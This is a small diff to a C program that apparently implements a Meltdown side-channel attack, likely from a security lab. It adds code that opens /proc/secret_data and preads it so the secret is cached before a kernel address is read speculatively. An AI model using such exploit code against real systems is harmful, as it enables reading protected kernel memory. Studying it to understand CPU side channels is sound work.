@@ -79,6 +79,14 @@ int main() {
   // FLUSH the probing array
   flushSideChannel();
 
+  // Open the /proc/secret_data virtual file
+  int fd = open("/proc/secret_data", O_RDONLY);
+  if (fd < 0) {
+    perror("open");
+    return -1;
+  }
+  int ret = pread(fd, NULL, 0, 0);
+
   if (sigsetjmp(jbuf, 1) == 0) {
     meltdown(0xfb61b000);
   } else {
